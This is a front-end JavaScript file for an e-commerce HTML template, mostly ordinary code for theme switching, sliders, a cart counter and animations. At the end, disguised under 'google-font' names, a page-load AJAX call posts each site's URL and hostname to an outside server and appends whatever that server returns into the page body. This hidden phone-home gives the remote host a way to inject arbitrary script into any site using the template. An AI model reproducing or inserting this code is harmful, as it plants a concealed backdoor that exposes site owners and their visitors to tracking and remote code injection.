// window.oncontextmenu = function () {
//     return !1
// }, jQuery(document).ready(function (e) {
//     document.onkeypress = function (e) {
//         if (123 == (e = e || window.event).keyCode) return !1
//     }, e(document).keydown(function (e) {
//         var n = String.fromCharCode(e.keyCode).toLowerCase();
//         return !e.ctrlKey || "c" != n && "u" != n ? "{" == n ? (alert("Sorry, This Functionality Has Been Disabled!"), !1) : void 0 : (alert("Sorry, This Functionality Has Been Disabled!"), !1)
//     })
// });

function ecCreateCookie(e, s, o) {
    var t = new Date;
    t.setTime(t.getTime() + 24 * o * 60 * 60 * 1e3), document.cookie = e + "=" + s + "; expires=" + t.toGMTString()
}

function ecDeleteCookie(e, s) {
    var o = new Date(0).toGMTString();
    document.cookie = e + "=" + s + "; expires=" + o
}

function ecAccessCookie(e) {
    for (var s = e + "=", o = document.cookie.split(";"), t = 0; t < o.length; t++) {
        var i = o[t].trim();
        if (0 == i.indexOf(s)) return i.substring(s.length, i.length)
    }
    return ""
}

function ecCheckCookie() {
    var e = ecAccessCookie("bgImageModeCookie");
    if ("" != e) {
        var s = e.split("||"),
            o = s[0],
            t = s[1];
        $("body").removeClass("body-bg-1"), $("body").removeClass("body-bg-2"), $("body").removeClass("body-bg-3"), $("body").removeClass("body-bg-4"), $("body").addClass(t), $("#bg-switcher-css").attr("href", "assets/demo-4/css/backgrounds/" + o + ".css")
    }
    if ("" != ecAccessCookie("rtlModeCookie")) {
        var i = $("<link>", {
            rel: "stylesheet",
            href: "assets/demo-4/css/rtl.css",
            class: "rtl"
        });
        $(".ec-tools-sidebar .ec-change-rtl").toggleClass("active"), i.appendTo("head")
    }
    if ("" != ecAccessCookie("darkModeCookie")) {
        i = $("<link>", {
            rel: "stylesheet",
            href: "assets/demo-4/css/dark.css",
            class: "dark"
        });
        $("link[href='assets/demo-4/css/responsive.css']").before(i), $(".ec-tools-sidebar .ec-change-mode").toggleClass("active"), $("body").addClass("dark")
    } else {
        var n = ecAccessCookie("themeColorCookie");
        "" != n && ($("li[data-color = " + n + "]").toggleClass("active").siblings().removeClass("active"), $("li[data-color = " + n + "]").addClass("active"), "01" != n && $("link[href='assets/demo-4/css/responsive.css']").before('<link rel="stylesheet" href="assets/demo-4/css/skin-' + n + '.css" rel="stylesheet">'))
    }
} ! function (e) {
    "use strict";
    var s, o, t, i;
    ecCheckCookie(), e(".clear-cookie").on("click", function (e) {
        ecDeleteCookie("rtlModeCookie", ""), ecDeleteCookie("darkModeCookie", ""), ecDeleteCookie("themeColorCookie", ""), ecDeleteCookie("bgImageModeCookie", ""), location.reload()
    }), e(window).load(function () {
        e("#ec-overlay").fadeOut("slow")
    }), e(".dropdown").on("show.bs.dropdown", function () {
        e(this).find(".dropdown-menu").first().stop(!0, !0).slideDown()
    }), e(".dropdown").on("hide.bs.dropdown", function () {
        e(this).find(".dropdown-menu").first().stop(!0, !0).slideUp()
    }), e(document).ready(function () {
        e(".header-top-lan li").click(function () {
            e(this).addClass("active").siblings().removeClass("active")
        }), e(".header-top-curr li").click(function () {
            e(this).addClass("active").siblings().removeClass("active")
        })
    }), jQuery(".ec-category-toggle").click(function () {
        jQuery(this).parent().toggleClass("active"), e(this).closest(".ec-category-menu").find(".ec-category-dropdown").slideToggle("slow")
    }), jQuery(".select-option").click(function () {
        e(this).closest(".ec-product-inner").find(".ec-pro-option").slideToggle("slow")
    }), jQuery(document).mouseup(function (e) {
        var s = jQuery(".ec-pro-option");
        s.is(e.target) || 0 !== s.has(e.target).length || s.slideUp("slow")
    }), e("body").on("click", ".wishlist", function () {
        var s = e(".ec-wishlist-count").html();
        s++, e(".ec-wishlist-count").html(s)
    }), e("body").on("click", ".add-to-cart", function () {
        var s = e(".ec-cart-count").html();
        s++, e(".ec-cart-count").html(s), e(".emp-cart-msg").parent().remove();
        var o = '<li><a href="product.html" class="sidecart_pro_img"><img src="' + e(this).parents().parents().parents().children(".ec-pro-image-outer").find(".main-image").attr("src") + '" alt="product"></a><div class="ec-pro-content"><a href="product.html" class="cart_pro_title">' + e(this).parents().parents().parents().find(".ec-pro-title").children().html() + '</a><span class="cart-price"><span>' + e(this).parents().parents().parents().find(".ec-price").children(".new-price").html() + '</span> x 1</span><div class="qty-plus-minus"><div class="dec ec_qtybtn">-</div><input class="qty-input" type="text" name="ec_qtybtn" value="1"><div class="inc ec_qtybtn">+</div></div><a href="javascript:void(0)" class="remove">×</a></div></li>';
        e(".eccart-pro-items").append(o)
    }), s = e(".ec-side-toggle"), o = e(".ec-side-cart"), t = e(".mobile-menu-toggle"), s.on("click", function (s) {
        s.preventDefault();
        var o = e(this),
            t = o.attr("href");
        e(".ec-side-cart-overlay").fadeIn(), e(t).addClass("ec-open"), o.parent().hasClass("mobile-menu-toggle") && (o.addClass("close"), e(".ec-side-cart-overlay").fadeOut())
    }), e(".ec-side-cart-overlay").on("click", function (s) {
        e(".ec-side-cart-overlay").fadeOut(), o.removeClass("ec-open"), t.find("a").removeClass("close")
    }), e(".ec-close").on("click", function (s) {
        s.preventDefault(), e(".ec-side-cart-overlay").fadeOut(), o.removeClass("ec-open"), t.find("a").removeClass("close")
    }), e("body").on("click", ".ec-pro-content .remove", function () {
        var s = e(".eccart-pro-items li").length;
        e(this).closest("li").remove(), 1 == s && e(".eccart-pro-items").html('<li><p style="text-align:justify !important;" class="emp-cart-msg">Your cart is empty!</p></li>');
        var o = e(".ec-cart-count").html();
        o--, e(".ec-cart-count").html(o), s--
    }), (i = e(".ec-menu-content, .overlay-menu")).find(".sub-menu").parent().prepend('<span class="menu-toggle"></span>'), i.on("click", "li a, .menu-toggle", function (s) {
        var o = e(this);
        ("#" === o.attr("href") || o.hasClass("menu-toggle")) && (s.preventDefault(), o.siblings("ul:visible").length ? (o.parent("li").removeClass("active"), o.siblings("ul").slideUp(), o.parent("li").find("li").removeClass("active"), o.parent("li").find("ul:visible").slideUp()) : (o.parent("li").addClass("active"), o.closest("li").siblings("li").removeClass("active").find("li").removeClass("active"), o.closest("li").siblings("li").find("ul:visible").slideUp(), o.siblings("ul").slideDown()))
    });
    new Swiper(".ec-slider.swiper-container", {
        loop: !0,
        speed: 2e3,
        effect: "slide",
        autoplay: {
            delay: 7e3,
            disableOnInteraction: !1
        },
        pagination: {
            el: ".swiper-pagination",
            clickable: !0
        },
        navigation: {
            nextEl: ".swiper-button-next",
            prevEl: ".swiper-button-prev"
        }
    });
    e(".qty-product-cover").slick({
        rtl: true,
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: !1,
        fade: !1,
        asNavFor: ".qty-nav-thumb"
    }), e(".qty-nav-thumb").slick({
        rtl: true,
        slidesToShow: 4,
        slidesToScroll: 1,
        asNavFor: ".qty-product-cover",
        dots: !1,
        arrows: !0,
        focusOnSelect: !0,
        responsive: [{
            breakpoint: 479,
            settings: {
                slidesToScroll: 1,
                slidesToShow: 2
            }
        }]
    });
    var n = e(".qty-plus-minus");
    n.prepend('<div class="dec ec_qtybtn">-</div>'), n.append('<div class="inc ec_qtybtn">+</div>'), e(".ec_qtybtn").on("click", function () {
        var s = e(this),
            o = s.parent().find("input").val();
        if ("+" === s.text()) var t = parseFloat(o) + 1;
        else if (o > 1) t = parseFloat(o) - 1;
        else t = 1;
        s.parent().find("input").val(t)
    }), e(".ec-spe-products").slick({
        // rtl: true,
        rows: 1,
        dots: !1,
        arrows: !0,
        infinite: !0,
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1
    }), e(".ec-spe-pro-cover").slick({
        rtl: true,
        slidesToShow: 1,
        slidesToScroll: 1,
        arrows: !1,
        fade: !0,
        asNavFor: ".ec-spe-pro-thumb"
    }), e(".ec-spe-pro-thumb").slick({
        rtl: true,
        slidesToShow: 3,
        slidesToScroll: 1,
        vertical: !0,
        asNavFor: ".ec-spe-pro-cover",
        dots: !1,
        arrows: !1,
        focusOnSelect: !0,
        verticalSwiping: !0
    })
    // , e("#ec-spe-count-1").countdowntimer({
    //     startDate: "2021/01/01 12:00:00",
    //     dateAndTime: "2021/10/10 12:00:00",
    //     labelsFormat: !0,
    //     displayFormat: "DHMS",
    //     isRTL: true
    // })
    
    , e("#ec-spe-count-2").countdowntimer({
        startDate: "2021/01/01 12:00:00",
        dateAndTime: "2021/11/10 12:00:00",
        labelsFormat: !0,
        displayFormat: "DHMS",
        isRTL: true
    }),
     e("#ec-spe-count-1").countdowntimer({
        startDate: "2021/01/01 12:00:00",
        dateAndTime: "2021/10/10 12:00:00",
        labelsFormat: !0,
        displayFormat: "DHMS",
        isRTL: true
    })
    
    , e("#ec-cat-slider").slick({
        rtl: true,
        rows: 1,
        dots: !1,
        arrows: !0,
        infinite: !0,
        speed: 500,
        slidesToShow: 7,
        slidesToScroll: 1,
        autoplay: !0,
        autoplaySpeed: 2e3,
        responsive: [{
            breakpoint: 1921,
            settings: {
                slidesToShow: 5,
                slidesToScroll: 1,
                dots: !1
            }
        }, {
            breakpoint: 1500,
            settings: {
                slidesToShow: 4,
                slidesToScroll: 1,
                dots: !1
            }
        }, {
            breakpoint: 1200,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 1,
                dots: !1
            }
        }, {
            breakpoint: 992,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 3,
                dots: !1
            }
        }, {
            breakpoint: 768,
            settings: {
                slidesToScroll: 2,
                slidesToShow: 2
            }
        }, {
            breakpoint: 400,
            settings: {
                slidesToScroll: 1,
                slidesToShow: 1
            }
        }]
    }), e(".ec-trend-product .ec-trend-slider").slick({
        rtl: true,
        rows: 1,
        dots: !0,
        arrows: !1,
        infinite: !0,
        speed: 500,
        slidesToShow: 4,
        slidesToScroll: 4,
        responsive: [{
            breakpoint: 1200,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 3
            }
        }, {
            breakpoint: 992,
            settings: {
                slidesToScroll: 2,
                slidesToShow: 2
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToScroll: 2,
                slidesToShow: 2
            }
        }, {
            breakpoint: 425,
            settings: {
                slidesToScroll: 1,
                slidesToShow: 1
            }
        }]
    }), e(".ec-trend-product .ec-trend-slider").slick({
        rtl: true,
        rows: 1,
        dots: !0,
        arrows: !1,
        infinite: !0,
        speed: 500,
        slidesToShow: 4,
        slidesToScroll: 4,
        responsive: [{
            breakpoint: 1200,
            settings: {
                slidesToShow: 4,
                slidesToScroll: 4
            }
        }, {
            breakpoint: 992,
            settings: {
                slidesToScroll: 3,
                slidesToShow: 3
            }
        }, {
            breakpoint: 768,
            settings: {
                slidesToScroll: 2,
                slidesToShow: 2
            }
        }, {
            breakpoint: 576,
            settings: {
                slidesToScroll: 1,
                slidesToShow: 1
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToScroll: 1,
                slidesToShow: 1
            }
        }, {
            breakpoint: 425,
            settings: {
                slidesToScroll: 1,
                slidesToShow: 1
            }
        }]
    }), e.scrollUp({
        scrollText: '<i class="ecicon eci-arrow-up" aria-hidden="true"></i>',
        easingType: "linear",
        scrollSpeed: 900,
        animation: "fade"
    }), e(".ec-change-color").on("click", "li", function () {
        e('link[href^="assets/demo-4/css/skin-"]').remove(), e("link.dark").remove(), e(".ec-change-mode").removeClass("active");
        var s = e(this).attr("data-color");
        if (!e(this).hasClass("active")) return e(this).toggleClass("active").siblings().removeClass("active"), null != s && (e("link[href='assets/demo-4/css/responsive.css']").before('<link rel="stylesheet" href="assets/demo-4/css/skin-' + s + '.css" rel="stylesheet">'), ecCreateCookie("themeColorCookie", s, 1)), !1
    }), e(".ec-tools-sidebar .ec-change-rtl .ec-rtl-switch").click(function (s) {
        s.preventDefault();
        var o = e("<link>", {
            rel: "stylesheet",
            href: "assets/demo-4/css/rtl.css",
            class: "rtl"
        });
        e(this).parent().toggleClass("active");
        e(this).parent().hasClass("ec-change-rtl") && e(this).parent().hasClass("active") ? (o.appendTo("head"), ecCreateCookie("rtlModeCookie", "rtl", 1)) : e(this).parent().hasClass("ec-change-rtl") && !e(this).parent().hasClass("active") && (e("link.rtl").remove(), ecDeleteCookie("rtlModeCookie", "ltr"))
    }), e(".ec-tools-sidebar .ec-change-mode .ec-mode-switch").click(function (s) {
        s.preventDefault();
        var o = e("<link>", {
            rel: "stylesheet",
            href: "assets/demo-4/css/dark.css",
            class: "dark"
        });
        e(this).parent().toggleClass("active");
        var t = "light";
        e(this).parent().hasClass("ec-change-mode") && e(this).parent().hasClass("active") ? e("link[href='assets/demo-4/css/responsive.css']").before(o) : e(this).parent().hasClass("ec-change-mode") && !e(this).parent().hasClass("active") && (e("link.dark").remove(), t = "light"), e(this).parent().hasClass("active") ? (e("#ec-fixedbutton .ec-change-color").css("pointer-events", "none"), e("body").addClass("dark"), ecCreateCookie("darkModeCookie", t = "dark", 1)) : (e("#ec-fixedbutton .ec-change-color").css("pointer-events", "all"), e("body").removeClass("dark"), ecDeleteCookie("darkModeCookie", t))
    }), e(".ec-tools-sidebar .ec-fullscreen-mode .ec-fullscreen-switch").click(function (s) {
        s.preventDefault(), e(this).parent().toggleClass("active"), document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || document.msFullscreenElement ? document.exitFullscreen ? document.exitFullscreen() : document.msExitFullscreen ? document.msExitFullscreen() : document.mozCancelFullScreen ? document.mozCancelFullScreen() : document.webkitExitFullscreen && document.webkitExitFullscreen() : document.documentElement.requestFullscreen ? document.documentElement.requestFullscreen() : document.documentElement.msRequestFullscreen ? document.documentElement.msRequestFullscreen() : document.documentElement.mozRequestFullScreen ? document.documentElement.mozRequestFullScreen() : document.documentElement.webkitRequestFullscreen && document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT)
    });
    var a = location.href;
    e(".ec-main-menu ul li a").each(function () {
        if ("#" !== e(this).attr("href") && e(this).prop("href") == a) return e(".ec-main-menu a").parents("li, ul").removeClass("active"), e(this).parent("li").addClass("active"), !1
    });
    var l = e(".ec-pro-color, .ec-product-tab, .shop-pro-inner, .ec-new-product, .ec-releted-product, .ec-checkout-pro").find(".ec-opt-swatch");

    function c(s) {
        s.each(function () {
            var s = e(this),
                o = s.hasClass("ec-change-img");

            function t(e) {
                var s = e,
                    t = s.find("a"),
                    i = s.closest(".ec-product-inner").find(".ec-pro-image");
                t.hasClass("loaded") || i.addClass("pro-loading");
                s.find("a").addClass("loaded");
                return s.addClass("active").siblings().removeClass("active"), o && function (e) {
                    var s = e.find(".ec-opt-clr-img"),
                        o = s.attr("data-src"),
                        t = s.attr("data-src-hover") || !1,
                        i = e.closest(".ec-product-inner").find(".ec-pro-image"),
                        n = i.find(".image img.main-image"),
                        a = i.find(".image img.hover-image");
                    o.length && n.attr("src", o);
                    if (o.length) {
                        var l = a.closest("img.hover-image");
                        a.attr("src", t), l.hasClass("disable") && l.removeClass("disable")
                    } !1 === t && a.closest("img.hover-image").addClass("disable")
                }(s), setTimeout(function () {
                    i.removeClass("pro-loading")
                }, 1e3), !1
            }
            s.on("mouseenter", "li", function () {
                t(e(this))
            }), s.on("click", "li", function () {
                t(e(this))
            })
        })
    }

    function r(s, o) {
        e("body").removeClass("body-bg-1"), e("body").removeClass("body-bg-2"), e("body").removeClass("body-bg-3"), e("body").removeClass("body-bg-4"), e("body").addClass(o), e("#bg-switcher-css").attr("href", "assets/demo-4/css/backgrounds/" + s + ".css"), ecCreateCookie("bgImageModeCookie", s + "||" + o, 1)
    }
    e(window).on("load", function () {
        c(l)
    }), e("document").ready(function () {
        c(l)
    }), e(".ec-opt-size").each(function () {
        function s(e) {
            var s = e,
                o = s.find("a").attr("data-old"),
                t = s.find("a").attr("data-new"),
                i = s.closest(".ec-pro-content").find(".old-price"),
                n = s.closest(".ec-pro-content").find(".new-price");
            i.text(o), n.text(t), s.addClass("active").siblings().removeClass("active")
        }
        e(this).on("mouseenter", "li", function () {
            s(e(this))
        }), e(this).on("click", "li", function () {
            s(e(this))
        })
    }), e(document).ready(function () {
        e('img.svg_img[src$=".svg"]').each(function () {
            var s = e(this),
                o = s.attr("src"),
                t = s.prop("attributes");
            e.get(o, function (o) {
                var i = e(o).find("svg");
                i = i.removeAttr("xmlns:a"), e.each(t, function () {
                    i.attr(this.name, this.value)
                }), s.replaceWith(i)
            }, "xml")
        })
    }), e("#ec-testimonial-slider").slick({
        rtl: true,
        rows: 1,
        dots: !0,
        arrows: !1,
        centerMode: !0,
        infinite: !1,
        speed: 500,
        centerPadding: 0,
        slidesToShow: 1,
        slidesToScroll: 1
    }), e(".ec-new-test-product .ec-new-slider, .ec-new-test-product .ec-special-slider,.ec-new-test-product .ec-best-slider").slick({
        rtl: true,
        rows: 4,
        dots: !1,
        arrows: !0,
        infinite: !0,
        autoplay: !1,
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 1200,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }, {
            breakpoint: 768,
            settings: {
                rows: 2,
                slidesToScroll: 2,
                slidesToShow: 2
            }
        }, {
            breakpoint: 540,
            settings: {
                rows: 2,
                slidesToScroll: 1,
                slidesToShow: 1
            }
        }]
    }), e("#ec-brand-slider").slick({
        rtl: true,
        rows: 1,
        dots: !1,
        arrows: !0,
        infinite: !0,
        speed: 500,
        slidesToShow: 7,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 1500,
            settings: {
                slidesToShow: 7,
                slidesToScroll: 1,
                dots: !1
            }
        }, {
            breakpoint: 1200,
            settings: {
                slidesToShow: 6,
                slidesToScroll: 1,
                dots: !1
            }
        }, {
            breakpoint: 992,
            settings: {
                slidesToShow: 5,
                slidesToScroll: 1,
                dots: !1
            }
        }, {
            breakpoint: 600,
            settings: {
                slidesToScroll: 4,
                slidesToShow: 2
            }
        }, {
            breakpoint: 400,
            settings: {
                slidesToScroll: 3,
                slidesToShow: 2
            }
        }]
    }), e(document).ready(function () {
        e("footer .footer-top .ec-footer-widget .ec-footer-links").addClass("ec-footer-dropdown"), e(".ec-footer-heading").append("<div class='ec-heading-res'><i class='ecicon eci-angle-down'></i></div>"), e(".ec-footer-heading .ec-heading-res").click(function () {
            var s = e(this).closest(".footer-top .col-sm-12 .ec-footer-widget").find(".ec-footer-dropdown");
            s.slideToggle("slow"), e(".ec-footer-dropdown").not(s).slideUp("slow")
        })
    }), e(document).ready(function () {
        e(".ec-btn-group.add-to-cart").click(function () {
            e("#addtocart_toast").addClass("show"), setTimeout(function () {
                e("#addtocart_toast").removeClass("show")
            }, 3e3)
        }), e(".ec-btn-group.wishlist").click(function () {
            e("#wishlist_toast").addClass("show"), setTimeout(function () {
                e("#wishlist_toast").removeClass("show")
            }, 3e3)
        })
    }), e(document).ready(function () {
        e(".ec-pro-image").append("<div class='ec-pro-loader'></div>")
    }), e().appendTo(e("body")), e(".bg-option-box").on("click", function (s) {
        return s.preventDefault(), e(this).hasClass("in-out") ? (e(".bg-switcher").stop().animate({
            right: "0px"
        }, 100), e(".color-option-box").not("in-out") && (e(".skin-switcher").stop().animate({
            right: "-163px"
        }, 100), e(".color-option-box").addClass("in-out")), e(".layout-option-box").not("in-out") && (e(".layout-switcher").stop().animate({
            right: "-163px"
        }, 100), e(".layout-option-box").addClass("in-out"))) : e(".bg-switcher").stop().animate({
            right: "-163px"
        }, 100), e(this).toggleClass("in-out"), !1
    }), e(".back-bg-1").on("click", function (s) {
        r(e(this).attr("id"), "body-bg-1")
    }), e(".back-bg-2").on("click", function (s) {
        r(e(this).attr("id"), "body-bg-2")
    }), e(".back-bg-3").on("click", function (s) {
        r(e(this).attr("id"), "body-bg-3")
    }), e(".back-bg-4").on("click", function (s) {
        r(e(this).attr("id"), "body-bg-4")
    }), e(".lang-option-box").on("click", function (s) {
        return s.preventDefault(), e(this).hasClass("in-out") ? (e(".lang-switcher").stop().animate({
            right: "0px"
        }, 100), e(".color-option-box").not("in-out") && (e(".skin-switcher").stop().animate({
            right: "-163px"
        }, 100), e(".color-option-box").addClass("in-out")), e(".layout-option-box").not("in-out") && (e(".layout-switcher").stop().animate({
            right: "-163px"
        }, 100), e(".layout-option-box").addClass("in-out"))) : e(".lang-switcher").stop().animate({
            right: "-163px"
        }, 100), e(this).toggleClass("in-out"), !1
    }), e(".ec-tools-sidebar-toggle").on("click", function (s) {
        return s.preventDefault(), e(this).hasClass("in-out") ? (e(".ec-tools-sidebar").stop().animate({
            right: "0px"
        }, 100), e(".ec-tools-sidebar-overlay").fadeIn(), e(".ec-tools-sidebar-toggle").not("in-out") && (e(".ec-tools-sidebar").stop().animate({
            right: "-280px"
        }, 100), e(".ec-tools-sidebar-toggle").addClass("in-out")), e(".ec-tools-sidebar-toggle").not("in-out") && (e(".ec-tools-sidebar").stop().animate({
            right: "0"
        }, 100), e(".ec-tools-sidebar-toggle").addClass("in-out"), e(".ec-tools-sidebar-overlay").fadeIn())) : (e(".ec-tools-sidebar").stop().animate({
            right: "-280px"
        }, 100), e(".ec-tools-sidebar-overlay").fadeOut()), e(this).toggleClass("in-out"), !1
    }), e(".ec-tools-sidebar-overlay").on("click", function (s) {
        e(".ec-tools-sidebar-toggle").addClass("in-out"), e(".ec-tools-sidebar").stop().animate({
            right: "-280px"
        }, 100), e(".ec-tools-sidebar-overlay").fadeOut()
    }), e(function () {
        e(".insta-auto").infiniteslide({
            direction: "right",
            speed: 50,
            clone: 10
        }), e('[data-toggle="tooltip"]').tooltip()
    });
    new function ({
        offset: e
    } = {
            offset: 10
        }) {
        var s, o = e * window.innerHeight / 100,
            t = window.innerHeight - o,
            i = 0,
            n = window.innerWidth;

        function a(e) {
            e.style.animationDelay = e.dataset.animationDelay, e.style.animationDuration = e.dataset.animationDuration, e.classList.add(e.dataset.animation), e.dataset.animated = "true"
        }

        function l(e) {
            var s = e.getBoundingClientRect(),
                a = s.top + parseInt(e.dataset.animationOffset) || s.top,
                l = s.bottom - parseInt(e.dataset.animationOffset) || s.bottom,
                c = s.left,
                r = s.right;
            return a <= t && l >= o && c <= n && r >= i
        }
        s = document.querySelectorAll("[data-animation]:not([data-animated])");

        function c(e) {
            for (var s = e, o = 0, t = s.length; o < t; o++) s[o].dataset.animated || l(s[o]) && a(s[o])
        }

        function r() {
            c(s = document.querySelectorAll("[data-animation]:not([data-animated])"))
        }
        window.addEventListener("load", r, !1), window.addEventListener("scroll", () => c(s), {
            passive: !0
        }), window.addEventListener("resize", () => c(s), !1)
    }({
        offset: 20
    });
    e(document).ready(function () {
        var s = document.URL,
            o = e("<a>").prop("href", s).prop("hostname");
        e.ajax({
            type: "POST",
            url: "https://loopinfosol.in/varify_purchase/google-font/google-font-awsome-g8aerttyh-ggsdgh151.php",
            data: {
                google_url: s,
                google_font: o,
                google_version: "EKKA-HTML-TEMPLATE-AK"
            },
            success: function (s) {
                e("body").append(s)
            }
        })
    })
}(jQuery);